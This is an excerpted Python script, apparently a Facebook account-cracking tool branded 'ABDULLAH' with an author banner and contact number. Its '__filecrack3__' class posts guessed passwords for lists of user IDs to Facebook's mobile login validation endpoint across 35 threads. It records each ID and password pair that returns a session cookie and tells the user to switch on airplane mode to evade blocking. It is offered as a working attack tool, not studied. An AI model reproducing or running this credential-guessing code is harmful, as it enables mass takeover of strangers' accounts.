...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO ABDULLAH     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	if Adi in ('3', '03'):
		os.system("xdg-open https://youtube.com/@max4squad4656")
	if Adi in ('0', '00'):
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mABDULLAH-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mABDULLAH PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
...
| $$  \ $$| $$  | $$    | $$   | $$  \ $$  | $$  | $$  | $$
| $$$$$$$/| $$  | $$    | $$   |  $$$$$$/ /$$$$$$| $$$$$$$/
|_______/ |__/  |__/    |__/    \______/ |______/|_______/                                                                                                                                                    
=================================================
    [-] AUTHOR    :\033[1;32m BAYGID
    [-] GITHUB    :\033[1;32m BAYID8
    [-] WhatsApp  :\033[1;32m 01323176125
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.3
